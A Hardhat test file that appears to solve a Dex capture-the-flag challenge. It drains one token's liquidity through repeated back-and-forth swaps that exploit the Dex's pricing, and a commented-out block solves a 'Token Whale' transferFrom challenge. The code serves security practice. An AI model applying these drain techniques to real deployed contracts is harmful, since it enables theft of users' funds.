import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { Dex, SwappableToken } from "../typechain-types/contracts/Dex.sol";

import { expect } from "chai";
import { token } from "../typechain-types/@openzeppelin/contracts";


let accounts: Signer[];
let contract: Dex;
var token1: SwappableToken;
var token2: SwappableToken;

describe("solutions: dex", () => {
    beforeEach(async () => {
       accounts = await ethers.getSigners();
       let owner = accounts[0].getAddress();
       let player = accounts[1].getAddress();
       const factory = await ethers.getContractFactory("Dex");
       const tokenFactory = await ethers.getContractFactory("SwappableToken");

       const factory2 = await ethers.getContractFactory("TestDex")
       contract = await factory.deploy(); 

       token1 = await tokenFactory.deploy(contract.getAddress(), "token1", "t1", 110) as SwappableToken
       token2 = await tokenFactory.deploy(contract.getAddress(), "token2", "t2", 110) as SwappableToken


       await contract.setTokens(token1.getAddress(), token2.getAddress())

       //await token1.approve(owner, contract.getAddress(), 110)
       //await token2.approve(owner, contract.getAddress(), 110)
       await contract.connect(accounts[0]).approve(contract.getAddress(), 100)

       await contract.addLiquidity(token1.getAddress(), 100)
       await contract.addLiquidity(token2.getAddress(), 100)
       console.log((await token1.balanceOf(contract.getAddress())))

       await token1.transfer(player, 10)
       await token2.transfer(player, 10)


    })
    it("Solves the challenge", async () => {
        let player = accounts[1]
        let balance
        await contract.connect(player).approve(contract.getAddress(), ethers.MaxUint256)
        while (
            await token1.balanceOf(contract.getAddress()) > 0 && 
            await token2.balanceOf(contract.getAddress()) > 0
        ) {

                balance = await token1.balanceOf(player.getAddress())
                let swapPrice = await contract.getSwapPrice(token1.getAddress(), token2.getAddress(), balance)
                if (swapPrice > (await token2.balanceOf(contract.getAddress()))) {
                    console.log("Not enough liquidity in token2 out")
                    let LiqBal = await token2.balanceOf(contract.getAddress())
                    let liqBalIn = await token1.balanceOf(contract.getAddress())
                    console.log("swapPrice: ", swapPrice)
                    console.log("userBalance: ", balance)
                    await contract.connect(player).swap(token1.getAddress(), token2.getAddress(), liqBalIn)
                    break
                } else {
                    await contract.connect(player).swap(token1.getAddress(), token2.getAddress(), balance)
                }

                balance = await token2.balanceOf(player.getAddress())
                let swapPrice2 = await contract.getSwapPrice(token2.getAddress(), token1.getAddress(), balance)
                if (swapPrice2 > (await token1.balanceOf(contract.getAddress()))) {
                    console.log("Not enough liquidity in token1 out")
                    let LiqBal = await token1.balanceOf(contract.getAddress())
                    let liqBalIn = await token2.balanceOf(contract.getAddress())
                    console.log("swapPrice: ", swapPrice)
                    console.log("userBalance: ", balance)
                    console.log("liqBal: ", LiqBal)
                    console.log("liqBalIn: ", liqBalIn)
                    await contract.connect(player).swap(token2.getAddress(), token1.getAddress(), liqBalIn)
                    break
                } else {
                    await contract.connect(player).swap(token2.getAddress(), token1.getAddress(), balance)
                }

        }
        console.log("Challenge solved")
        console.log("Token1 balance: ", await token1.balanceOf(contract.getAddress()))
        console.log("Token2 balance: ", await token2.balanceOf(contract.getAddress()))
        console.log("Player balance: ", await token1.balanceOf(player))
        console.log("Player balance: ", await token2.balanceOf(player))
    })
})
// describe("Solutions: Token Whale", () => {
//     beforeEach((async () => {
//         accounts = await ethers.getSigners();
//         const factory = await ethers.getContractFactory("TokenWhaleChallenge");
//         contract = await factory.deploy(accounts[0].getAddress());
//     }))
//     it("Solves the challenge", async () => {
//         await contract.transfer(accounts[1].getAddress(), 510)
//         await contract.connect(accounts[1]).approve(accounts[0].getAddress(), 1000)
//         await contract.transferFrom(accounts[1].getAddress(), accounts[1].getAddress(), 500)
//     })
// })

// describe("Solutions: Dex", () => {
//     beforeEach((async () => {
//         accounts = await ethers.getSigners();
//         const factory = await ethers.getContractFactory("Dex");
//         const tokenFactory = await ethers.getContractFactory("SwappableToken");
//         contract = await factory.deploy(); 
//         token0 = await tokenFactory.deploy(contract.getAddress(), "token0", "T0"
//     }))
// }echidna contracts/Dex.sol --contract TestDex --test-limit 100000)